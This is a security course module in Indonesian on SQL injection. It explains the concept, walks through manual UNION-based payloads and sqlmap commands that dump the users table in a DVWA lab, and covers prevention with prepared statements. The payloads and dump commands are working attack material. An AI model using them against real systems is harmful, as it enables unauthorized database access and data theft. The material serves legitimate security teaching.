# 💉 Pertemuan 8: Web Application Security - SQL Injection

## Daftar Isi
1. [Pengantar SQL Injection](#1-pengantar-sql-injection)
2. [Cara Kerja SQL Injection](#2-cara-kerja-sql-injection)
3. [Jenis-Jenis SQL Injection](#3-jenis-jenis-sql-injection)
4. [Hands-On: Setup Lab DVWA (Damn Vulnerable Web App)](#4-hands-on-setup-lab-dvwa-damn-vulnerable-web-app)
5. [Hands-On: Manual Union-Based SQL Injection](#5-hands-on-manual-union-based-sql-injection)
6. [Hands-On: Automated SQL Injection dengan sqlmap](#6-hands-on-automated-sql-injection-dengan-sqlmap)
7. [Deteksi dan Pencegahan](#7-deteksi-dan-pencegahan)
8. [Latihan Mandiri](#8-latihan-mandiri)

---

## 1. Pengantar SQL Injection

**SQL Injection (SQLi)** adalah kerentanan keamanan web yang memungkinkan penyerang untuk mengganggu query yang dibuat oleh aplikasi ke database. Penyerang biasanya dapat melihat data yang tidak seharusnya mereka akses, atau bahkan mengubah/menghapus data tersebut.

---

## 2. Cara Kerja SQL Injection

SQLi terjadi ketika aplikasi mengambil input pengguna dan menggabungkannya langsung ke dalam query SQL tanpa sanitasi yang benar.

```sql
-- Query Normal di Server
"SELECT * FROM users WHERE id = " + userInput;

-- Jika userInput = 1
SELECT * FROM users WHERE id = 1;

-- Jika userInput = 1 OR 1=1
SELECT * FROM users WHERE id = 1 OR 1=1; -- Menampilkan SEMUA user!
```

---

## 3. Jenis-Jenis SQL Injection

1. **In-band SQLi (Classic)**: Penyerang menggunakan saluran komunikasi yang sama untuk melancarkan serangan dan mengambil hasil (misal: Union-based atau Error-based).
2. **Inferential SQLi (Blind)**: Penyerang tidak bisa melihat data langsung, tapi bisa menyimpulkan data berdasarkan respon server (misal: Boolean-based atau Time-based).
3. **Out-of-band SQLi**: Penyerang menggunakan saluran komunikasi berbeda (misal: DNS atau HTTP request dari database).

---

## 4. Hands-On: Setup Lab DVWA (Damn Vulnerable Web App)

Kita menggunakan container `web-dvwa` yang sudah ada di `docker-compose.yml`.

1. Pastikan container berjalan.
2. Akses `http://localhost:8080` (tergantung port mapping Anda).
3. Login dengan `admin` / `password`.
4. Klik **DVWA Security** dan set level ke **Low**.
5. Pilih menu **SQL Injection**.

---

## 5. Hands-On: Manual Union-Based SQL Injection

### Langkah 1: Mencari Titik Kerentanan
Masukkan `'` (petik tunggal) di kolom User ID. Jika muncul error SQL, berarti aplikasi rentan.

### Langkah 2: Menentukan Jumlah Kolom
Gunakan `ORDER BY`:
```sql
1' ORDER BY 1#  -- OK
1' ORDER BY 2#  -- OK
1' ORDER BY 3#  -- ERROR (Berarti ada 2 kolom)
```

### Langkah 3: Menampilkan Data via UNION
Cari tahu kolom mana yang ditampilkan di layar:
```sql
1' UNION SELECT 1,2#
```

### Langkah 4: Mengambil Informasi Database
```sql
1' UNION SELECT database(), user()#
```

---

## 6. Hands-On: Automated SQL Injection dengan sqlmap

`sqlmap` adalah tool open-source yang mendeteksi dan mengeksploitasi celah SQLi secara otomatis.

### 6.1 Scan Dasar
Di container Kali:
```bash
# Ganti URL dan Cookie dengan yang ada di browser Anda
sqlmap -u "http://172.20.0.10/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=..." --batch
```

### 6.2 Mengambil Nama Database
```bash
sqlmap -u "http://..." --cookie="..." --dbs
```

### 6.3 Dump Tabel Users
```bash
sqlmap -u "http://..." --cookie="..." -D dvwa -T users --dump
```

---

## 7. Deteksi dan Pencegahan

### 7.1 Prepared Statements (Parameterized Queries)
Ini adalah cara paling efektif. Data pengguna tidak lagi dianggap sebagai bagian dari perintah SQL.

```php
// Contoh PHP PDO - AMAN
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
```

### 7.2 Input Validation & Sanitization
Hanya terima input yang sesuai format (misal: ID harus angka).

### 7.3 Principle of Least Privilege
Database user untuk aplikasi web sebaiknya tidak memiliki akses `root` atau `DROP TABLE`.

---

## 8. Latihan Mandiri

### Latihan 1: Blind SQL Injection
Coba menu **SQL Injection (Blind)** di DVWA. Gunakan `sqlmap` dengan flag `--technique=B` untuk melihat bagaimana tool tersebut bekerja tanpa output data langsung.

### Latihan 2: Bypass Login
Cari aplikasi web latihan lain dan coba bypass form login menggunakan `' OR '1'='1`.
